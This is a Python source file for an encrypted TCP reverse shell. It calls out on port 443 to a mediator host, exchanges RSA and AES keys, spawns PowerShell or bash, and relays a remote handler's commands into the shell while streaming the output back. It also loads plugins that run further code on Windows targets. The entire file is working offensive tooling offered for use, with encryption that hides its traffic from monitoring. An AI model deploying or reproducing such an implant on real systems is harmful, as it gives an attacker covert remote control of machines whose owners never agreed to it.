#!/usr/bin/env python3
"""
Program: reverseShell.py
Description: End-to-end encrypted TCP reverse shell -- connects to mediator server to be bridged to the handler client connection
"""

from argparse import ArgumentParser
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from inspect import getmembers, isclass
from pathlib import Path
from platform import system
try:
    from . import plugins
except ImportError:
    import plugins
import select
import socket
import subprocess
from sys import exit
from threading import Thread


class ReverseShell:
    def __init__(self, mediatorHost="", connectionKey="#!ConnectionKey_CHANGE_ME!!!"):
        self.connectionKey = connectionKey
        self.handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.plugins = self.loadPlugins()
        if not mediatorHost:
            raise(ValueError("Hostname of mediator server not specified."))
        self.mediatorHost = mediatorHost

    def loadPlugins(self):
        commandClasses = getmembers(plugins, isclass)
        commandClasses.pop(0)
        externalCommands = dict()
        for className, commandClass in commandClasses:
            externalCommands[commandClass.name()] = commandClass.windowsTarget
        return externalCommands

    def tryPlugin(self, commandLine):
        argv = commandLine.split()
        if not argv:
            # newline sent -- not a plugin
            return False
        command = argv[0]
        try:
            self.plugins[command](argv, self.handler, self.cipherKey)
            return True
        except KeyError:
            # command not in plugins
            return False

    def readCommands(self, cmdexe):
        while True:
            ready, _, _ = select.select([self.handler], [], [], 0)
            if ready:
                nonce = self.handler.recv(16)
                tag = self.handler.recv(16)
                ciphertext = self.handler.recv(1024)
                cipher = AES.new(self.cipherKey, AES.MODE_EAX, nonce=nonce)
                command = cipher.decrypt(ciphertext)
                if len(command) > 0:
                    # check if command is a plugin -- if so run plugin's windows target code
                    plugin = self.tryPlugin(command.decode())
                    if plugin:
                        # print new prompt after plugin is run
                        cmdexe.stdin.write(b'\n')
                        cmdexe.stdin.flush()
                    else:
                        # not a plugin -- send command to shell
                        cmdexe.stdin.write(command)
                        cmdexe.stdin.flush()
                        # change working directory if cd command
                        if "cd " in command.decode() or "cd\n" in command.decode():
                            command = command.decode().strip()
                            if len(command) == 2:
                                p = Path("~")
                            else:
                                p = Path(command[3:])
                            if p.is_dir():
                                # not a directory -- let shell output error message
                                pass

    def sendResponses(self, cmdexe):
        while True:
            ch = cmdexe.stdout.read(1)
            cipher = AES.new(self.cipherKey, AES.MODE_EAX)
            nonce = cipher.nonce
            ciphertext, tag = cipher.encrypt_and_digest(ch)
            self.handler.sendall(nonce)
            self.handler.sendall(tag)
            self.handler.sendall(ciphertext)

    def keyExchange(self):
        try:
            ready, _, _ = select.select([self.handler], [], [])
            if ready:
                pemPubKey = self.handler.recv(1024)
            pubKey = RSA.import_key(pemPubKey)
        except ValueError:
            # timeout or duplicate key -- connection closed by server
            # change key or try again soon
            exit(1)
        key = get_random_bytes(32)
        cipher = PKCS1_OAEP.new(pubKey)
        message = cipher.encrypt(key)
        self.handler.sendall(message)
        return key

    def connect(self, mediatorHost):
        self.handler.connect((socket.gethostbyname(mediatorHost), 443))
        self.handler.sendall(self.connectionKey.encode())
        while True:
            ready, _, _ = select.select([self.handler], [], [])
            if ready:
                signal = self.handler.recv(1024)
            else:
                print("\nServer timed out")
                continue
            if signal.decode() == "PING":
                self.handler.sendall("PONG".encode())
                print(".", end="", flush=True)
            elif signal.decode() == "TIMEOUT":
                print("\nHandler connection timed out")
                exit(1)
            elif signal.decode() == self.connectionKey:
                print("\nHandler connection established")
                break
            else:
                print("\nCRITIAL: Connection key validation failed")
                print("Server responded with the wrong key: {}".format(signal.decode()))
                exit(1)

    def run(self):
        self.connect(self.mediatorHost)
        self.cipherKey = self.keyExchange()
        if system() == "Windows":
            shell = "\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        else:
            shell = "/bin/bash"
        cmdexe = subprocess.Popen([shell],
                                  shell=True,
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.STDOUT,
                                  stdin=subprocess.PIPE)
        s2p_thread = Thread(target=self.readCommands, args=[cmdexe])
        s2p_thread.daemon = True
        s2p_thread.start()
        p2s_thread = Thread(target=self.sendResponses, args=[cmdexe])
        p2s_thread.daemon = True
        p2s_thread.start()
        try:
            cmdexe.wait()
        except KeyboardInterrupt:
            self.handler.close()


if __name__ == "__main__":
    parser = ArgumentParser(description="")
    parser.add_argument("-c", "--connection-key", dest="connectionKey", action="store")
    parser.add_argument("-s", "--server", dest="serverAddr", action="store",
                        default="example.com")
    args = parser.parse_args()
    if args.serverAddr == "example.com":
        exit(1)
    if args.connectionKey:
        rShell = ReverseShell(mediatorHost=args.serverAddr, connectionKey=args.connectionKey)
    else:
        rShell = ReverseShell(mediatorHost=args.serverAddr)
    rShell.run()

